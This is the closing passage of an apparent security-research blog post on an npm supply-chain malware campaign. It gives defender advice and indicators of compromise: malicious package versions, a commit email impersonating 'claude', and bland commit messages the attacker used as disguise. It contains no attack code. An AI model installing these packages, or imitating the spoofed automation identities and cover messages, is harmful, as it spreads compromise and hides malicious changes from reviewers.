+<p>At the same time, it still looks like a work in progress. Some parts are carefully engineered, but others are surprisingly careless. The BPF object still contains debug metadata and recoverable source lines, and the operator even hardcoded a wallet recovery phrase into the malware’s skip list. These mistakes gave us a rare look into how the implant works. In other words, this may not be the final form of the campaign,  it may be the rehearsal.</p>
+<hr>
+<h2 id="for-defenders"><a href="#for-defenders" aria-hidden="true" tabindex="-1"><strong>For defenders</strong></a></h2>
+<p>Audit every repository the account could write to. Look for backdated commits, suspicious branches, unexpected build hooks, and changes attributed to <code>claude</code>, <code>dependabot[bot]</code>, <code>renovate[bot]</code>, <code>github-actions[bot]</code>, or other automation identities outside their normal context. </p>
+<p>For npm packages, unpublish or deprecate malicious versions where possible and publish a clean version with a clear security advisory. </p>
+<p>Rotate all keys and secrets available for the compromised account</p>
+<p>JFrog Curation customers are protected, as all of the relevant packages were added as malicious in the JFrog Catalog. We are continuing to monitor the campaign and adding more packages as malicious as the campaign develops.</p>
+<h2 id="indicators-of-compromise"><a href="#indicators-of-compromise" aria-hidden="true" tabindex="-1"><strong>Indicators of compromise</strong></a></h2>
+<p><strong>Commit author emails:</strong> <code>claude@users.noreply.github.com</code> · </p>
+<p><strong>NPM packages (all published from the account asteroiddao )</strong>:</p>
+<table>
+<thead>
+<tr>
+<th align="left">weavedb-lite@0.1.1</th>
+<th align="left">XRAY-989671</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">weavedb-sdk-base@0.21.1</td>
+<td align="left">XRAY-989492</td>
+</tr>
+<tr>
+<td align="left">test-weavedb-sdk@1.1.1</td>
+<td align="left">XRAY-989648</td>
+</tr>
+<tr>
+<td align="left">weavedb-warp-contracts-plugin-deploy@1.0.11</td>
+<td align="left">XRAY-989666</td>
+</tr>
+<tr>
+<td align="left">arnext-arkb@0.0.2</td>
+<td align="left">XRAY-989571</td>
+</tr>
+<tr>
+<td align="left">weavedb-console@0.2.1</td>
+<td align="left">XRAY-989594</td>
+</tr>
+<tr>
+<td align="left">arnext@0.1.5</td>
+<td align="left">XRAY-989617</td>
+</tr>
+<tr>
+<td align="left">roidjs@0.1.7</td>
+<td align="left">XRAY-989784</td>
+</tr>
+<tr>
+<td align="left">weavedb-exm-sdk@0.7.4</td>
+<td align="left">XRAY-989764</td>
+</tr>
+<tr>
+<td align="left">create-arnext-app@0.0.10</td>
+<td align="left">XRAY-989681</td>
+</tr>
+<tr>
+<td align="left">weavedb-tools@0.45.3</td>
+<td align="left">XRAY-989760</td>
+</tr>
+<tr>
+<td align="left">wdb-core@0.1.2</td>
+<td align="left">XRAY-989766</td>
+</tr>
+<tr>
+<td align="left">cwao-tools@0.3.1</td>
+<td align="left">XRAY-989752</td>
+</tr>
+<tr>
+<td align="left">test-ajs@0.1.19</td>
+<td align="left">XRAY-989779</td>
+</tr>
+<tr>
+<td align="left">monade@0.0.7</td>
+<td align="left">XRAY-989547</td>
+</tr>
+<tr>
+<td align="left">weavedb-exm-sdk-web@0.7.4</td>
+<td align="left">XRAY-989747</td>
+</tr>
+<tr>
+<td align="left">testnpmnmp@1.0.21</td>
+<td align="left">XRAY-989781</td>
+</tr>
+<tr>
+<td align="left">warp-contracts-plugin-deploy-test@3.0.1</td>
+<td align="left">XRAY-989754</td>
+</tr>
+<tr>
+<td align="left">wdb-cli@0.1.1</td>
+<td align="left">XRAY-989761</td>
+</tr>
+<tr>
+<td align="left">ai3@0.3.5</td>
+<td align="left">XRAY-989753</td>
+</tr>
+<tr>
+<td align="left">cwao-units@0.8.3</td>
+<td align="left">XRAY-989762</td>
+</tr>
+<tr>
+<td align="left">atomic-notes@0.5.3</td>
+<td align="left">XRAY-989758</td>
+</tr>
+<tr>
+<td align="left">cwao@0.5.6</td>
+<td align="left">XRAY-989756</td>
+</tr>
+<tr>
+<td align="left">weavedb-client@0.45.3</td>
+<td align="left">XRAY-989775</td>
+</tr>
+<tr>
+<td align="left">wdb-sdk@0.1.2</td>
+<td align="left">XRAY-989773</td>
+</tr>
+<tr>
+<td align="left">weavedb-offchain@0.45.4</td>
+<td align="left">XRAY-989783</td>
+</tr>
+<tr>
+<td align="left">fpjson-lang@0.1.7</td>
+<td align="left">XRAY-989641</td>
+</tr>
+<tr>
+<td align="left">weavedb-contracts@0.45.2</td>
+<td align="left">XRAY-989771</td>
+</tr>
+<tr>
+<td align="left">weavedb-node-client@0.45.3</td>
+<td align="left">XRAY-989765</td>
+</tr>
+<tr>
+<td align="left">arjson@0.1.4</td>
+<td align="left">XRAY-989767</td>
+</tr>
+<tr>
+<td align="left">hbsig@0.3.2</td>
+<td align="left">XRAY-989769</td>
+</tr>
+<tr>
+<td align="left">zkjson@0.8.5</td>
+<td align="left">XRAY-989787</td>
+</tr>
+<tr>
+<td align="left">aonote@0.11.1</td>
+<td align="left">XRAY-989790</td>
+</tr>
+<tr>
+<td align="left">weavedb-base@0.45.3</td>
+<td align="left">XRAY-989751</td>
+</tr>
+<tr>
+<td align="left">weavedb-sdk-node@0.45.3</td>
+<td align="left">XRAY-989772</td>
+</tr>
+<tr>
+<td align="left">wao@0.41.2</td>
+<td align="left">XRAY-989785</td>
+</tr>
+<tr>
+<td align="left">weavedb-sdk@0.45.3</td>
+<td align="left">XRAY-989789</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Commit messages:</strong> </p>
+<p><code>fix: resolve lint warnings</code> ·</p>
+<p> <code>test: add missing edge case</code> · </p>
+<p><code>ci: update workflow configuration</code> · </p>
+<p><code>fix: address review feedback</code> · </p>
+<p><code>docs: update contributing guide</code> · </p>
+<p><code>chore: sync lockfile</code> · </p>
+<p><code>fix: handle null pointer case</code> · </p>
+<p><code>build: bump patch version</code> · <code>chore: update dependencies</code></p>
+</section><!----></div></div></div></main><footer class="py-4 main-footer bg-black dark:bg-gray-950"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Terms of Use
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Cookies Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
+              Privacy Policy
+            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
+              Cookies Settings
+            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
+      ©2026 All Rights Reserved. JFrog Ltd.
+    </p></div></footer></div>
+    <script src="/assets/js/app.86c48cc4.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
